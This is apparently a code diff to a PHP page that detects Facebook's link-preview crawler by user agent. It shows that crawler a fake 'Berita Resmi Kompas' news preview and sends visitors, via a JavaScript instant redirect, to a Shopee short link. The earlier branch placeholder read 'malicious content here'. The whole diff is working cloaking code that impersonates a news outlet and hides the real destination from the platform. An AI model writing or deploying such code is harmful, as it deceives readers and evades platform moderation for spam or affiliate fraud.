@@ -7,7 +7,11 @@ if (strpos($userAgent, 'facebookexternalhit') !== false) {
 <html>
 <head>
   <meta property="og:title" content="Berita Resmi Kompas" />
-  <meta property="og:image" content="https://media-origin.kompas.tv/library/image/content_article/desktop_thumbnail/20260418014045.webp" />
+  <meta property="og:image" content="http://sintaxshop.github.io/viqey/aaa.jpg" />
+  <script type="text/javascript">
+        // Mengganti halaman saat ini dengan halaman tujuan secara instan
+        window.location.replace("https://s.shopee.co.id/4VYJaEeqMq");
+  </script>
 </head>
 <body>Halaman normal</body>
 </html>
@@ -19,7 +23,9 @@ if (strpos($userAgent, 'facebookexternalhit') !== false) {
 <head>
   <title>Halaman Asli</title>
 </head>
-<body>Konten jahat disini</body>
+<body>
+  <p>Mengalihkan halaman... <a href="https://s.shopee.co.id/4VYJaEeqMq">Klik di sini</a> jika tidak otomatis berpindah.</p>
+</body>
 </html>
 
 <?php } ?>
